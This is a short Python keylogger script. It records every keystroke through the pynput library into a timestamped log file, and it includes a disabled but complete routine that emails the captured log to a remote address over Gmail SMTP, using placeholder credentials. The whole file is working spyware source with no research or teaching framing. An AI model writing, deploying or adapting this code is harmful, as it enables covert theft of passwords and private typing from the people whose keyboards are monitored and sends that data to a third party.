from os.path import getsize
from os.path import exists
from pynput import keyboard
import smtplib
import datetime

if exists("log.txt"):
    pass
else:
    f=open("log.txt", "a")
    f.close()
    
send=False
if send == True:
    try:
        filesize = getsize("log.txt")
        if filesize > 0:
            senderEmail = "sender@gmail.com"
            receverEmail = "recever@gmail.com"
            password = "password-sender"

            f = open("log.txt", "r")
            message = f.read()
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(senderEmail, password)
            server.sendmail(senderEmail, receverEmail, message)
            server.quit()
            f.close()
    except:
        pass


f = open("log.txt", "a")
d = datetime.datetime.now()
header = f"\n\n{d.day}/{d.month}/{d.year}_{d.hour}:{d.minute}:{d.second} :\n"
f.write(header)
f.close()

def capture(key):
    ch = str(key)

    if "Key." in ch:
        ch = f"[{ch}]"
    elif "\\x" in ch:
        ch = ""
    elif ch == "\"\'\"":
        ch = ch.replace("\"", "")
    elif ch == "\'\"\'":
        ch = ch.replace("\'", "")
    elif ch == "\'\\\\\'":
        ch = "\\"
    elif ch == "[\'~\']" or ch == "[\'`\']":
        ch = ch.replace("\'", "")
        ch = ch.replace("[", "")
        ch = ch.replace("]", "")
    else:
        ch = ch.replace("\'", "")

    if ch == "<96>":ch = "0"
    elif ch == "<97>": ch = "1"
    elif ch == "<98>": ch = "2"
    elif ch == "<99>": ch ="3"
    elif ch == "<100>": ch = "4"
    elif ch == "<101>": ch = "5"
    elif ch == "<102>": ch = "6"
    elif ch == "<103>": ch = "7"
    elif ch == "<104>": ch = "8"
    elif ch == "<105>": ch = "9"
    elif ch == "<110>": ch = "."

    #print(ch)
    f = open("log.txt", "a")
    fr = open("log.txt", "r")
    if len(fr.readlines()[-1]) >= 100:
        f.write("\n")
    f.write(ch)
    f.close()
    fr.close()



with keyboard.Listener(on_press=capture) as listener:
    listener.join()
    